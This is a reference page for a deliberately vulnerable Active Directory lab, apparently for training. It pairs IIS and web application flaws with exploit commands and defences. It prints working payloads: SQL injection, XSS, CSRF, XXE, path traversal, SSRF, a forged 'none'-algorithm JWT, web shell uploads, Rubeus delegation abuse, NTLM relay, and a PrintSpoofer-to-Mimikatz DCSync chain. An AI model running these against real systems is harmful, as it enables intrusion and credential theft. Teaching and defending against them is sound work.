# Web Vulnerabilities Reference

This document covers the web vulnerability configurations (`WEB-` tags) present in the EMPIRE AD Lab, including IIS server misconfigurations, common web application vulnerabilities, and Active Directory-integrated web attack vectors.

---

## Web Shell to AD Domain Admin Chain

The following diagram illustrates how an attacker can leverage a web application vulnerability to gain a foothold on the server and ultimately compromise the entire Active Directory domain.

```mermaid
graph TD
    A[Attacker: Zero Creds] -->|Exploit WebApp SQLi / Path Traversal| B[foothold: IIS AppPool / Web Shell]
    B -->|Local PrivEsc via SeImpersonate / Potato| C[SYSTEM on IIS Server]
    C -->|Extract DPAPI / WebApp web.config Creds| D[svc_app service account credentials]
    D -->|Constrained Delegation / S4U2self| E[Impersonate DA on Domain Controller]
```

---

## IIS Infrastructure & Configuration (WEB-001 .. WEB-015)

### WEB-001: IIS Installed + Running
* **Explanation**: The Internet Information Services (IIS) web server role is installed and active on `scarif.empire.local`. It hosts the corporate web portal and functions as the primary initial access web target.
* **Exploit/Execution**:
  An attacker performs passive banner grabbing or sends a simple GET request:
  ```bash
  curl -I http://10.10.0.13/
  ```
* **Detection & Prevention**:
  * *Detection*: Monitor the state of the IIS Admin Service (`IISADMIN`) and World Wide Web Publishing Service (`W3SVC`) on the host.
  * *Prevention*: Disable or uninstall the Web Server role if IIS is not required on the server:
    ```powershell
    Uninstall-WindowsFeature -Name Web-Server -Remove
    ```

### WEB-002: Anonymous Authentication on Default Site
* **Explanation**: The default site on IIS allows Anonymous Authentication, permitting any remote user to browse the web server contents and interact with applications without verifying their identity.
* **Exploit/Execution**:
  Check if pages are accessible without credentials:
  ```bash
  curl -s -o /dev/null -w "%{http_code}" http://10.10.0.13/default.aspx
  ```
  A status code of `200` confirms anonymous access is allowed.
* **Detection & Prevention**:
  * *Detection*: Audit IIS settings using PowerShell:
    ```powershell
    Get-WebConfigurationProperty -Filter /system.webServer/security/authentication/anonymousAuthentication -Name Enabled -PSPath "IIS:\sites\Default Web Site"
    ```
  * *Prevention*: Disable anonymous authentication and require authenticated access (e.g., Windows Authentication):
    ```powershell
    Set-WebConfigurationProperty -Filter /system.webServer/security/authentication/anonymousAuthentication -Name Enabled -Value $false -PSPath "IIS:\sites\Default Web Site"
    ```

### WEB-003: Directory Browsing Enabled
* **Explanation**: Directory browsing is enabled globally or on specific folders (like `/uploads/`), allowing attackers to list directory contents when no default document (e.g. `default.aspx`) is present. This exposes hidden files, backup files, and script structures.
* **Exploit/Execution**:
  Request a directory URL directly:
  ```bash
  curl -s http://10.10.0.13/uploads/
  ```
  If directory browsing is active, the response will contain an HTML-formatted index of files.
* **Detection & Prevention**:
  * *Detection*: Check the `web.config` file for the following element:
    ```xml
    <directoryBrowse enabled="true"/>
    ```
  * *Prevention*: Disable directory browsing in the IIS site configuration or `web.config`:
    ```powershell
    Set-WebConfigurationProperty -Filter /system.webServer/directoryBrowse -Name enabled -Value $false -PSPath "IIS:\sites\Default Web Site"
    ```

### WEB-004: WebDAV with Write Permissions (PUT method)
* **Explanation**: The WebDAV publishing module is enabled on the IIS server and configured with write permissions, allowing unauthorized remote users to upload, modify, or delete files on the web server using HTTP methods like `PUT`.
* **Exploit/Execution**:
  Attempt to upload a text file to the web server using `PUT`:
  ```bash
  curl -X PUT http://10.10.0.13/uploads/test.txt -d "WebDAV PUT Exploit Test"
  curl http://10.10.0.13/uploads/test.txt
  ```
* **Detection & Prevention**:
  * *Detection*: Check IIS logs for HTTP requests with the `PUT` or `MOVE` verbs.
  * *Prevention*: Disable WebDAV publishing under the IIS role features, or restrict authoring rules so that write operations are disabled:
    ```powershell
    Disable-WebConfiguration -Filter /system.webServer/webdav -PSPath "IIS:\sites\Default Web Site"
    ```

### WEB-005: HTTP TRACE Method Enabled
* **Explanation**: The HTTP `TRACE` method is enabled on the server. This method echoes the received request back to the client. If the application uses session cookies or authorization headers, an attacker can steal them using Cross-Site Scripting (XSS) via Cross-Site Tracking (XST).
* **Exploit/Execution**:
  Send an HTTP TRACE request containing a cookie header:
  ```bash
  curl -X TRACE http://10.10.0.13/ -H "Cookie: session_token=SuperSecretToken123"
  ```
  If TRACE is enabled, the server will echo the header in the response body.
* **Detection & Prevention**:
  * *Detection*: Verify if TRACE returns the request headers.
  * *Prevention*: Reject the TRACE verb using Request Filtering in `web.config`:
    ```xml
    <system.webServer>
      <security>
        <requestFiltering>
          <verbs>
            <add verb="TRACE" allowed="false"/>
          </verbs>
        </requestFiltering>
      </security>
    </system.webServer>
    ```

### WEB-006: IIS Server Version Header Exposed
* **Explanation**: The server returns headers disclosing the web server software and versions (such as `Server: Microsoft-IIS/10.0` or `X-Powered-By: ASP.NET`). This aids attackers in performing targeted version-specific vulnerability scans.
* **Exploit/Execution**:
  Request the HTTP headers of the site:
  ```bash
  curl -I http://10.10.0.13/
  ```
  Look for `Server` and `X-Powered-By` in the output headers.
* **Detection & Prevention**:
  * *Detection*: Scan HTTP responses for version and framework banners.
  * *Prevention*: Remove or modify these headers in `web.config` or IIS:
    ```xml
    <system.webServer>
      <httpProtocol>
        <customHeaders>
          <remove name="X-Powered-By" />
        </customHeaders>
      </httpProtocol>
    </system.webServer>
    ```

### WEB-007: ASP.NET Error Details Exposed (custom errors off)
* **Explanation**: IIS/ASP.NET is configured with custom errors disabled (`<customErrors mode="Off"/>`) and compilation debugging enabled (`<compilation debug="true"/>`). If the application encounters an unhandled exception, it outputs detailed stack traces, code snippets, and internal database queries directly to the client.
* **Exploit/Execution**:
  Force an exception (e.g., supply an invalid query parameter to an ASPX page):
  ```bash
  curl "http://10.10.0.13/login.aspx?user='"
  ```
  The resulting page contains the SQL query structure and stack trace details.
* **Detection & Prevention**:
  * *Detection*: Audit `web.config` for `<customErrors mode="Off"/>`.
  * *Prevention*: Set custom errors to `On` or `RemoteOnly` in production:
    ```xml
    <system.web>
      <customErrors mode="RemoteOnly" defaultRedirect="myerrorpage.aspx"/>
      <compilation debug="false"/>
    </system.web>
    ```

### WEB-008: Upload Directory World-Writable
* **Explanation**: The physical directory dedicated to user uploads (`C:\inetpub\wwwroot\uploads\`) has overly permissive NTFS permissions (e.g., Write permissions granted to "Everyone" or "Users"). An attacker can drop files to disk via service exploits or webshells.
* **Exploit/Execution**:
  Check folder ACLs on the target machine:
  ```cmd
  icacls C:\inetpub\wwwroot\uploads
  ```
  Look for `(OI)(CI)F` or `(W)` mappings for groups like `Everyone` or `BUILTIN\Users`.
* **Detection & Prevention**:
  * *Detection*: Run file-system permission audits on web directories regularly.
  * *Prevention*: Assign write permissions only to the specific identity running the IIS application pool (e.g., `IIS AppPool\DefaultAppPool`), and deny write/modify access to general user groups.

### WEB-009: Insecure web.config with SQL Credentials
* **Explanation**: The main application configuration file (`web.config`) contains plaintext database connection strings, passwords, or API keys, allowing any local attacker (or someone with path traversal access) to compromise backend databases.
* **Exploit/Execution**:
  Read the contents of the `web.config` file:
  ```bash
  curl "http://10.10.0.13/path_traversal.aspx?file=web.config"
  ```
  Retrieve plaintext credentials such as `SqlSaPassword` or `AdminPassword`.
* **Detection & Prevention**:
  * *Detection*: Search configuration files for database passwords and secrets.
  * *Prevention*: Encrypt connection strings inside `web.config` using ASP.NET IIS registration tool:
    ```cmd
    aspnet_regiis -pe "connectionStrings" -app "/DefaultWS"
    ```
    Or use external key vaults (like Azure Key Vault) to inject secrets at runtime.

### WEB-010: IIS Application Pool Running as SYSTEM
* **Explanation**: The IIS application pool hosting the website is configured to run under the context of a high-privileged account (such as `LocalSystem`, `Administrator`, or a custom service account like `svc_iis` with `SeImpersonatePrivilege`). If the web server is compromised, the attacker can run code with system-level access.
* **Exploit/Execution**:
  Run `whoami` and inspect privileges from a web shell:
  ```bash
  # Exploiting web shell to check privileges
  curl "http://10.10.0.13/upload.aspx?cmd=whoami+/priv"
  ```
  If `SeImpersonatePrivilege` is enabled, the attacker can leverage privilege escalation tools like PrintSpoofer.
* **Detection & Prevention**:
  * *Detection*: Query IIS configuration for application pool identities:
    ```powershell
    Get-WebConfigurationProperty -Filter /system.applicationHost/applicationPools -Name identityType
    ```
  * *Prevention*: Run application pools under low-privilege accounts (like `ApplicationPoolIdentity`) and follow the principle of least privilege.

### WEB-011: IIS Logs World-Readable
* **Explanation**: The directory containing IIS logs (`C:\inetpub\logs\LogFiles\`) allows read access for standard users. Since HTTP logs store requested URIs (which may leak session tokens or user parameters) and User-Agent fields, this directory is a high-value target for information harvesting.
* **Exploit/Execution**:
  From a low-privileged context:
  ```cmd
  dir C:\inetpub\logs\LogFiles\
  type C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
  ```
* **Detection & Prevention**:
  * *Detection*: Check access control lists (ACLs) on the `LogFiles` directory.
  * *Prevention*: Restrict directory permissions so that only `SYSTEM` and `Administrators` can read IIS logs.

### WEB-012: ASPX Shell Upload via WebDAV
* **Explanation**: The file upload functionality on `upload.aspx` lacks file extension validation, letting authenticated or anonymous attackers upload executable `.aspx` web shell scripts directly and execute them on the server.
* **Exploit/Execution**:
  Upload a web shell using `curl` and execute an OS command:
  ```bash
  curl -F "file=@cmd.aspx" http://10.10.0.13/upload.aspx
  curl "http://10.10.0.13/uploads/cmd.aspx?cmd=whoami"
  ```
* **Detection & Prevention**:
  * *Detection*: Scan the web directory for new or modified `.aspx` files and analyze IIS logs for execution of unfamiliar scripts.
  * *Prevention*: Apply strict file extension whitelists (e.g. only allow `.jpg`, `.png`), store uploaded files outside the web root, and disable execution permissions on the upload folder.

### WEB-013: FTP + WebDAV Same Root (cross-protocol upload)
* **Explanation**: The FTP service and WebDAV web directories point to the same physical folder on the server. An attacker can bypass HTTP upload restrictions by writing files using anonymous FTP and executing them as web shells via HTTP.
* **Exploit/Execution**:
  1. Upload the shell via FTP:
     ```bash
     ftp 10.10.0.13
     # Login as anonymous, navigate to uploads
     put shell.aspx
     ```
  2. Execute the shell via HTTP:
     ```bash
     curl http://10.10.0.13/uploads/shell.aspx?cmd=whoami
     ```
* **Detection & Prevention**:
  * *Detection*: Monitor file creation logs in web directories where FTP write access is allowed.
  * *Prevention*: Keep the FTP directory root and the HTTP document root completely isolated.

### WEB-014: IIS Short File Name (8.3 filename) Enumeration
* **Explanation**: IIS generates 8.3 short names for compatibility. An attacker can send specially crafted HTTP requests containing wildcard characters (e.g. `~1`) to determine the names of files and directories that are otherwise hidden.
* **Exploit/Execution**:
  Send wildcard queries to scan for short names:
  ```bash
  # Scanner tool syntax (e.g. iis-shortname-scanner)
  java -jar iis_shortname_detector.jar 20 5 http://10.10.0.13/
  ```
* **Detection & Prevention**:
  * *Detection*: Audit registry settings for 8.3 name generation.
  * *Prevention*: Disable 8.3 name generation on NTFS partitions:
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name "NtfsDisable8dot3NameCreation" -Value 1
    ```

### WEB-015: IIS ISAPI Filter Vulnerability Stub
* **Explanation**: A legacy or unpatched ISAPI filter (e.g., custom URL rewriting or routing extension) is registered on IIS. This configuration can introduce memory corruption, buffer overflows, or authentication bypass risks.
* **Exploit/Execution**:
  Inspect loaded ISAPI filters using PowerShell:
  ```powershell
  Get-WebConfigurationProperty -Filter /system.webServer/isapiFilters -Name collection -PSPath "IIS:\sites\Default Web Site"
  ```
* **Detection & Prevention**:
  * *Detection*: Review all registered ISAPI filters in IIS Manager.
  * *Prevention*: Remove unnecessary or legacy ISAPI filters.

---

## Web Application Vulnerabilities (WEB-021 .. WEB-030)

### WEB-021: SQL Injection via ASPX Page
* **Explanation**: The SQL search endpoint (`sqli.aspx?id=`) concatenates input directly into an SQL query executed on the backend database. This permits UNION-based queries, error-based exploitation, or blind SQL injection.
* **Exploit/Execution**:
  Submit a UNION payload to read credentials from the database:
  ```bash
  curl "http://10.10.0.13/sqli.aspx?id=1%20UNION%20SELECT%20username,password,role,email%20FROM%20dbo.users"
  ```
* **Detection & Prevention**:
  * *Detection*: Implement database query logging and analyze HTTP traffic for common SQL operators (`UNION`, `SELECT`, `--`).
  * *Prevention*: Use parameterized queries (Prepared Statements) or an Object-Relational Mapper (ORM):
    ```csharp
    SqlCommand cmd = new SqlCommand("SELECT * FROM products WHERE id=@id", conn);
    cmd.Parameters.AddWithValue("@id", id);
    ```

### WEB-022: XSS via Reflected Parameter
* **Explanation**: The search endpoint (`xss.aspx?q=`) takes parameter input and returns it directly in the HTTP response body without sanitization or HTML encoding. This allows an attacker to execute client-side scripts in the context of the user's session.
* **Exploit/Execution**:
  Inject a basic script payload:
  ```bash
  curl "http://10.10.0.13/xss.aspx?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
  ```
* **Detection & Prevention**:
  * *Detection*: Look for HTML characters (`<`, `>`, `script`) reflected in web application output.
  * *Prevention*: HTML-encode all user-supplied data before rendering it:
    ```csharp
    Response.Write(Server.HtmlEncode(Request.QueryString["q"]));
    ```
    Implement a strong Content Security Policy (CSP).

### WEB-023: CSRF — No Token Validation
* **Explanation**: Actions in the web application (such as the login page or profile updates) lack anti-CSRF tokens. An attacker can construct a malicious site that forces a victim's browser to submit requests to the application.
* **Exploit/Execution**:
  An attacker hosts a form on a remote page:
  ```html
  <form action="http://10.10.0.13/login.aspx" method="POST" id="csrf">
    <input type="hidden" name="user" value="admin" />
    <input type="hidden" name="pass" value="SithLord123!" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
  ```
* **Detection & Prevention**:
  * *Detection*: Inspect post parameters for unique tokens.
  * *Prevention*: Require anti-forgery validation tokens on state-changing requests, and configure cookies with the `SameSite=Strict` or `SameSite=Lax` attribute.

### WEB-024: Path Traversal via File Download Endpoint
* **Explanation**: The file download endpoint (`path_traversal.aspx?file=`) accepts relative file path parameters without sanitization. An attacker can use directory traversal sequences (`../`) to read files from the host operating system.
* **Exploit/Execution**:
  Request a system configuration file or the application's configuration:
  ```bash
  curl "http://10.10.0.13/path_traversal.aspx?file=..\..\..\..\Windows\win.ini"
  curl "http://10.10.0.13/path_traversal.aspx?file=web.config"
  ```
* **Detection & Prevention**:
  * *Detection*: Monitor request URLs for directory traversal sequences like `..%2f` and `..\`.
  * *Prevention*: Do not accept raw file paths from clients. Use a fixed whitelist of files, or run `Path.GetFileName()` to extract only the filename:
    ```csharp
    string filename = Path.GetFileName(Request.QueryString["file"]);
    string safePath = Path.Combine(@"C:\inetpub\wwwroot\static\", filename);
    ```

### WEB-025: XXE Injection in XML Endpoint
* **Explanation**: The XML parser used by the application processes external entity definitions (`DTD`). This lets attackers define an entity referencing a local file or external endpoint, triggering local file disclosure or SSRF.
* **Exploit/Execution**:
  Send a POST request containing an XML external entity payload:
  ```bash
  curl -X POST http://10.10.0.13/xml_endpoint.aspx -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]><search><id>&xxe;</id></search>'
  ```
* **Detection & Prevention**:
  * *Detection*: Inspect incoming requests for `<!ENTITY` and `SYSTEM` tags in XML payloads.
  * *Prevention*: Disable DTD processing entirely on the XML parser:
    ```csharp
    XmlReaderSettings settings = new XmlReaderSettings();
    settings.DtdProcessing = DtdProcessing.Prohibit;
    ```

### WEB-026: SSRF via Image Fetch Endpoint
* **Explanation**: The image retrieval endpoint (`ssrf.aspx?url=`) accepts a user-provided URL and fetches the resource from the server side. An attacker can use this to scan internal ports, interact with local services, or pivot to internal network assets.
* **Exploit/Execution**:
  Send requests to scan internal network endpoints or local services:
  ```bash
  curl "http://10.10.0.13/ssrf.aspx?url=http://127.0.0.1:80/"
  curl "http://10.10.0.13/ssrf.aspx?url=http://10.10.0.10:88/"
  ```
* **Detection & Prevention**:
  * *Detection*: Check outbound server traffic logs for requests originating from the web application pool account to internal destinations.
  * *Prevention*: Implement a strict whitelist of permitted target domains, restrict outbound web server traffic at the firewall level, and reject requests targeting private IP space (RFC 1918).

### WEB-027: Insecure Deserialization (ViewState without MAC)
* **Explanation**: The application uses ASP.NET ViewState without Message Authentication Code (MAC) verification enabled. An attacker can modify the serialized object in the ViewState parameter to trigger code execution when the server deserializes it.
* **Exploit/Execution**:
  Generate an exploit payload using `ysoserial.net` targeting `ActivitySurrogateSelector` or another formatter, and send it as the `__VIEWSTATE` parameter.
* **Detection & Prevention**:
  * *Detection*: Scan configuration files for ViewState MAC settings:
    ```xml
    <!-- Vulnerable setting -->
    <pages enableViewStateMac="false"/>
    ```
  * *Prevention*: Never disable ViewState MAC verification. Ensure it is enabled in your `web.config`:
    ```xml
    <pages enableViewStateMac="true"/>
    ```

### WEB-028: JWT None Algorithm Bypass Stub
* **Explanation**: The application's JWT signature verification logic accepts the `"none"` algorithm option. An attacker can modify the JWT header to `{"alg":"none"}` and forge the payload without generating a valid cryptographic signature.
* **Exploit/Execution**:
  Construct a forged token:
  ```bash
  # Header: {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  # Payload: {"user":"admin"}          -> eyJ1c2VyIjoiYWRtaW4ifQ
  # Final Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
  curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http://10.10.0.13/api/profile
  ```
* **Detection & Prevention**:
  * *Detection*: Analyze JWT library configurations.
  * *Prevention*: Ensure the JWT validation framework explicitly rejects the "none" algorithm and enforces signature verification using designated keys:
    ```csharp
    tokenValidationParameters.ValidAlgorithms = new[] { "HS256", "RS256" };
    ```

### WEB-029: Open Redirect
* **Explanation**: The application redirects users based on a query parameter value without validating the target URL's domain. Attackers can leverage this to redirect users to credential-harvesting pages.
* **Exploit/Execution**:
  ```bash
  curl -I "http://10.10.0.13/redirect.aspx?url=http://phishing-site.com"
  ```
  Check if the `Location` header points to the external domain.
* **Detection & Prevention**:
  * *Detection*: Monitor redirects to domains outside the company's network.
  * *Prevention*: Restrict redirects to local paths relative to the host, or validate redirect parameters against a whitelist of trusted domains:
    ```csharp
    if (Url.IsLocalUrl(url)) { return Redirect(url); }
    ```

### WEB-030: IDOR — User ID Enumeration via Parameter
* **Explanation**: The profile page returns user details based on a numeric parameter (`id=`) without verifying whether the currently authenticated session owns or is authorized to view that profile.
* **Exploit/Execution**:
  Iterate through IDs to extract employee information:
  ```bash
  for id in {1..10}; do
    curl -s "http://10.10.0.13/profile.aspx?id=$id" | grep -i "SSN"
  done
  ```
* **Detection & Prevention**:
  * *Detection*: Audit access control logs to see if users are making frequent, sequential requests for identifiers that do not belong to their session.
  * *Prevention*: Implement a server-side authorization check to ensure the logged-in user owns the resource, or replace sequential IDs with non-guessable identifiers (such as GUIDs).

---

## Active Directory Integrated Web Attacks (WEB-061 .. WEB-070)

### WEB-061: Kerberos Constrained Delegation via Web App
* **Explanation**: The web server's service account (`svc_iis`) is configured with Kerberos constrained delegation (`msDS-AllowedToDelegateTo` targeting `MSSQLSvc/kamino.empire.local`). If an attacker compromises the web server and retrieves the service account's credentials (or its NTLM/AES key), they can request service tickets for any user (including Domain Admins) to access the database using S4U2self and S4U2proxy protocols.
* **Exploit/Execution**:
  Using `Rubeus` to execute an S4U transition:
  ```cmd
  Rubeus.exe s4u /user:svc_iis /aes256:49A8B6... /impersonateuser:Administrator /msdsspn:MSSQLSvc/kamino.empire.local /ptt
  ```
* **Detection & Prevention**:
  * *Detection*: Monitor event logs for Event ID 4769 (Kerberos Service Ticket request) featuring the `S4U2self` or `S4U2proxy` options.
  * *Prevention*: Use Group Managed Service Accounts (gMSA) to automate credential rotation. Place sensitive administrative accounts in the "Protected Users" group, which blocks delegation.

### WEB-062: Unconstrained Delegation Web Identifiers (Stub)
* **Explanation**: Stubs representing cases where IIS servers are configured with unconstrained delegation, allowing the server to cache the TGT of any domain user authenticating via Kerberos.
* **Exploit/Execution**:
  Query AD for accounts trusted for delegation using PowerView:
  ```powershell
  Get-DomainComputer -Unconstrained
  ```
* **Detection & Prevention**:
  * *Detection*: Review the `userAccountControl` attribute on computer accounts in Active Directory.
  * *Prevention*: Avoid using unconstrained delegation; migrate all delegation configurations to constrained or resource-based constrained delegation (RBCD).

### WEB-063: Web Application SPN Configuration (Stub)
* **Explanation**: Configuration stub covering instances where web applications use default service principal names (SPNs) or lack proper SPN segregation, which can expose the accounts to Kerberoasting.
* **Exploit/Execution**:
  Request SPNs for web services:
  ```powershell
  Get-DomainUser -SPN "HTTP/*"
  ```
* **Detection & Prevention**:
  * *Detection*: Review SPN registrations on domain user accounts.
  * *Prevention*: Ensure HTTP services run under computer accounts or gMSAs rather than standard domain user accounts.

### WEB-064: HTTP Auth Downgrade Vectors (Stub)
* **Explanation**: Stubs representing configurations where legacy authentication protocols (like Basic or NTLM) are preferred over Kerberos on web portals, making credentials vulnerable to network sniffing and replay.
* **Exploit/Execution**:
  Inspect the HTTP headers or response bodies to verify if basic authentication prompts are returned.
* **Detection & Prevention**:
  * *Detection*: Perform regular vulnerability scans to verify SSL and authentication configurations.
  * *Prevention*: Enforce TLS 1.2/1.3 and require Negotiate/Kerberos authentication.

### WEB-065: NTLM Authentication in Web App
* **Explanation**: The site uses Windows Authentication with NTLM fallback enabled on directories like `/secure/`. When a user authenticates, their browser performs a handshake. An attacker on the local network can intercept this handshake and relay it to other services (such as SMB or LDAP).
* **Exploit/Execution**:
  1. Test authentication:
     ```bash
     curl --ntlm -u dvad\luke.skywalker:SithLord123! http://10.10.0.13/secure/
     ```
  2. Perform NTLM relay:
     ```bash
     # Relay HTTP auth to SMB on the Domain Controller
     ntlmrelayx.py --target smb://10.10.0.10/ -tf targets.txt
     ```
* **Detection & Prevention**:
  * *Detection*: Look for anomalous web traffic on Windows Authentication paths.
  * *Prevention*: Disable NTLM authentication, require Kerberos (Negotiate), and configure Extended Protection for Authentication (EPA) with Channel Binding.

### WEB-066..069: Web Service Vulnerability Placeholders (Stubs)
* **Explanation**: Placeholders documenting educational web service configuration issues, such as vulnerable AD CS Web Enrollment (HTTP endpoint) leading to credential relay.
* **Exploit/Execution**:
  Identify HTTP endpoints using `nmap` or `crackmapexec`.
* **Detection & Prevention**:
  * *Detection*: Review running HTTP services on domain-joined systems.
  * *Prevention*: Keep all AD-related web services patched and secured.

### WEB-070: Web Shell to AD Compromise Chain
* **Explanation**: The full web-to-AD attack path. It starts with an attacker exploiting SQL Injection (WEB-021) to obtain SQL credentials, uploading an ASPX web shell (WEB-012) via a vulnerability in the upload page, executing a Potato exploit via `SeImpersonatePrivilege` (WEB-010) to obtain SYSTEM, dumping credentials from LSASS/SAM, and using those credentials to lateral to the Domain Controller for domain takeover (DCSync).
* **Exploit/Execution**:
  1. Upload the shell and check execution:
     ```bash
     curl -F "file=@cmd.aspx" http://10.10.0.13/upload.aspx
     curl "http://10.10.0.13/uploads/cmd.aspx?cmd=whoami"
     ```
  2. Execute privilege escalation to SYSTEM:
     ```bash
     curl "http://10.10.0.13/uploads/cmd.aspx?cmd=C:\Tools\PrintSpoofer.exe%20-c%20whoami"
     ```
  3. Execute Mimikatz to dump NTDS database via DCSync:
     ```bash
     curl "http://10.10.0.13/uploads/cmd.aspx?cmd=C:\Tools\mimikatz.exe%20\"lsadump::dcsync%20/domain:empire.local%20/user:krbtgt\""
     ```
* **Detection & Prevention**:
  * *Detection*: Monitor process creation logs (Event ID 4688) for execution of web shell child processes (like `cmd.exe` or `powershell.exe` spawned by `w3wp.exe`).
  * *Prevention*: Harden application permissions: do not grant the application pool service account unnecessary privileges like `SeImpersonatePrivilege`. Enforce host-based segregation and disable credential caching on member servers.
